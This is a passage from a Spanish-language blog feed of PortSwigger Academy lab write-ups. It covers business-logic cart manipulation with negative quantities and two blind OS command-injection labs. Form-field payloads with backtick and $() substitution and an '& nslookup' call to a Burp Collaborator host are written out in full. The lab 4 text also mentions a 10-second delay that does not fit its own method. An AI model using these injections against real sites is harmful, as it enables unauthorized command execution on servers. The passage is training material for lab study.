			loading=&#34;lazy&#34;
			alt=&#34;Carretilla con los productos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Carretilla con los productos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto damos a &lt;code&gt;place order&lt;/code&gt; y realizamos la compra sin problemas y nos devuelve que hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 254; 
			flex-basis: 609px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/resuelto.png&#34; data-size=&#34;1771x697&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/resuelto.png&#34;
			width=&#34;1771&#34;
			height=&#34;697&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/resuelto_hucab2378217428ead621bfea8e8a1e062_96508_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/resuelto_hucab2378217428ead621bfea8e8a1e062_96508_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/</link>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 2" /&gt;&lt;h1 id=&#34;lab-high-level-logic-vulnerability&#34;&gt;Lab: High-level logic vulnerability&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;p&gt;En este caso lo que deberiamos de poder hacer es comprar un &lt;code&gt;Lightweight l33t leather jacket&lt;/code&gt; para resolver el lab usando las credenciales de &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo que podemos notar es que la web envia una peticion con el producto para agregar a la carretilla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 90; 
			flex-basis: 216px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/articulo.png&#34; data-size=&#34;1787x1977&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/articulo.png&#34;
			width=&#34;1787&#34;
			height=&#34;1977&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Articulo en venta para agregar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Articulo en venta para agregar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso seguimos el proceso y al enviar el producto a la carretilla es enviado el id del producto, y la cantidad del producto a enviar. Por lo que la enviamos. Pero si cambiamos el valor a un numero negativo lo acepta e intentar pagar de esa manera. Pero nos salta el error de &lt;code&gt;Cart total price cannot be less than zero&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Podemos cambiar la cantidad a valor negativo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 115; 
			flex-basis: 276px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/carterror.png&#34; data-size=&#34;1142x991&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/carterror.png&#34;
			width=&#34;1142&#34;
			height=&#34;991&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/carterror_hu005967a92cdc7e1805d05929d06235fb_63368_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/carterror_hu005967a92cdc7e1805d05929d06235fb_63368_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Pago con valor negativo&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Pago con valor negativo&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora lo interesante ya que no permite pagar valores menores a 0 pero si elegir cantidades con valores negativos enviaremos la compra de &lt;code&gt;Lightweight&lt;/code&gt; con cantidad 1 y otro producto con cantidades negativas para restar el total.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 347px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request.png&#34; data-size=&#34;780x539&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request.png&#34;
			width=&#34;780&#34;
			height=&#34;539&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request_huaa4d2eff30ea2e6cdbfa075d97f52165_66840_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request_huaa4d2eff30ea2e6cdbfa075d97f52165_66840_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud para enviar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud para enviar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 283; 
			flex-basis: 679px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request2.png&#34; data-size=&#34;1229x434&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request2.png&#34;
			width=&#34;1229&#34;
			height=&#34;434&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request2_hub6d8e355212b07e11153eefa4edf31af_66946_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/request2_hub6d8e355212b07e11153eefa4edf31af_66946_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud para enviar a carretilla con cantidad negativa&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud para enviar a carretilla con cantidad negativa&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego si vemos la aplicacion vemos que nos da un total de $34.25 con el credito que si contamos. Para eso pagamos y nos lo aceptaria.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 111; 
			flex-basis: 268px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/cart.png&#34; data-size=&#34;1157x1036&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/cart.png&#34;
			width=&#34;1157&#34;
			height=&#34;1036&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/cart_hu149f68ca87658deee6d392918ddbb789_69866_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/cart_hu149f68ca87658deee6d392918ddbb789_69866_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Carretilla con los productos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Carretilla con los productos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto damos a &lt;code&gt;place order&lt;/code&gt; y realizamos la compra sin problemas y nos devuelve que hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 232; 
			flex-basis: 557px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/resuelto.png&#34; data-size=&#34;1789x770&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/resuelto.png&#34;
			width=&#34;1789&#34;
			height=&#34;770&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/resuelto_hue57d9fd35b6fcef8601d5e144c7a8046_105674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-2/resuelto_hue57d9fd35b6fcef8601d5e144c7a8046_105674_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: OS Command Injection Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/</link>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: OS Command Injection Lab 3" /&gt;&lt;h1 id=&#34;lab-blind-os-command-injection-with-output-redirection&#34;&gt;Lab: Blind OS command injection with output redirection&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es obtener ejecucion de comandos en el sitio web, pero ya que no se recibe respuesta hay que escribir un archivo dentro de la web para poder mostrar la salida del comando en un archivo y posteriormente recuperarlo.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web cuenta con un formulario para el envio de feedback hacia el correo del servidor.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 119; 
			flex-basis: 286px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/web.png&#34; data-size=&#34;1193x1000&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/web.png&#34;
			width=&#34;1193&#34;
			height=&#34;1000&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/web_hub723137999b8577144085ec4be2a679e_50121_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/web_hub723137999b8577144085ec4be2a679e_50121_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero hace una peticion que lo que hace es enviar el correo por medio de una consulta por terminal de &lt;code&gt;mail&lt;/code&gt; que es para el envio de correo por terminal linux.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request.png&#34; data-size=&#34;1532x553&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request.png&#34;
			width=&#34;1532&#34;
			height=&#34;553&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request_hud95893744cd9c514047af26e7b3de18d_75046_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request_hud95893744cd9c514047af26e7b3de18d_75046_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El tipo de ejecucion que se hace al backend es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que haremos es inyectar otros parametros para poder ejecutar otros comandos, y queremos ejecutar la siguiente consulta para que nos devuelva el nombre del usuario que esta ejecutando el script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;whoami &amp;gt; /var/www/images/whoami.txt&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;whoami &amp;gt; /var/www/images/whoami.txt&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Por lo que la peticion quedaria asi (codificada en formato URL)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;csrf=19jGeYaNMECUmKvnBJNL0vXbIEuE06Cj&amp;amp;name=name&amp;amp;email=email%40mail.com&amp;amp;subject=subject&amp;amp;message=message+`whoami+&amp;gt;+/var/www/images/whoami.txt`%0D%0A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos una ejecucion de comandos dentro del servidor&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 294; 
			flex-basis: 706px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request2.png&#34; data-size=&#34;1519x516&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request2.png&#34;
			width=&#34;1519&#34;
			height=&#34;516&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request2_huaf717e6cd5ccbf7b64b4ba51e055890d_75487_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request2_huaf717e6cd5ccbf7b64b4ba51e055890d_75487_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora solo queda recuperar el contenido del archivo:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 357; 
			flex-basis: 858px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request3.png&#34; data-size=&#34;1542x431&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request3.png&#34;
			width=&#34;1542&#34;
			height=&#34;431&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request3_hu0a92e15f74dfd50c4b3a5ea12585a57d_61148_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/request3_hu0a92e15f74dfd50c4b3a5ea12585a57d_61148_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud del archivo creado con el output del comando&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud del archivo creado con el output del comando&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 248; 
			flex-basis: 596px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/resuelto.png&#34; data-size=&#34;1785x718&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/resuelto.png&#34;
			width=&#34;1785&#34;
			height=&#34;718&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/resuelto_hu61c46daccb61e4e7c3a88592f65b064c_218314_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-3/resuelto_hu61c46daccb61e4e7c3a88592f65b064c_218314_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: OS Command Injection Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/</link>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: OS Command Injection Lab 4" /&gt;&lt;h1 id=&#34;lab-blind-os-command-injection-with-out-of-band-interaction&#34;&gt;Lab: Blind OS command injection with out-of-band interaction&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es obtener ejecucion de comandos en el sitio web, pero ya que no se recibe respuesta hay que realizar una consulta hacia el dns o una web para saber que se ejecuto la secuencia correctamente./&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web cuenta con un formulario para el envio de feedback hacia el correo del servidor.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 119; 
			flex-basis: 286px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/web.png&#34; data-size=&#34;1193x1000&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/web.png&#34;
			width=&#34;1193&#34;
			height=&#34;1000&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/web_hub723137999b8577144085ec4be2a679e_50121_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/web_hub723137999b8577144085ec4be2a679e_50121_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero hace una peticion que lo que hace es enviar el correo por medio de una consulta por terminal de &lt;code&gt;mail&lt;/code&gt; que es para el envio de correo por terminal linux.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request.png&#34; data-size=&#34;1532x553&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request.png&#34;
			width=&#34;1532&#34;
			height=&#34;553&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request_hud95893744cd9c514047af26e7b3de18d_75046_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request_hud95893744cd9c514047af26e7b3de18d_75046_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El tipo de ejecucion que se hace al backend es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que haremos es inyectar otros parametros para poder ejecutar otros comandos, y queremos ejecutar la siguiente consulta para que nos devuelva el nombre del usuario que esta ejecutando el script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; nslookup url.burpcollaborator.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Por lo que la peticion quedaria asi (codificada en formato URL)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;csrf=19jGeYaNMECUmKvnBJNL0vXbIEuE06Cj&amp;amp;name=name&amp;amp;email=email%40mail.com&amp;amp;subject=subject&amp;amp;message=message+%26+nslookup+co4yszdbwhw8owp25ugijgpwinoec3.burpcollaborator.net
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos una ejecucion de comandos dentro del servidor, porque la respuesta ha tardado 10 segundos en contestar como se puede ver en la &lt;code&gt;esquina inferior derecha&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 180; 
			flex-basis: 432px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request2.png&#34; data-size=&#34;877x487&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request2.png&#34;
			width=&#34;877&#34;
			height=&#34;487&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request2_hud21d4c798d0d7f47d39c7ad7a80bb74e_65890_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/request2_hud21d4c798d0d7f47d39c7ad7a80bb74e_65890_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 300; 
			flex-basis: 722px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/resuelto.png&#34; data-size=&#34;1733x576&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/resuelto.png&#34;
			width=&#34;1733&#34;
			height=&#34;576&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/resuelto_hu2651fe7020f5d8c48ac45c3df860be3b_84918_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-4/resuelto_hu2651fe7020f5d8c48ac45c3df860be3b_84918_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
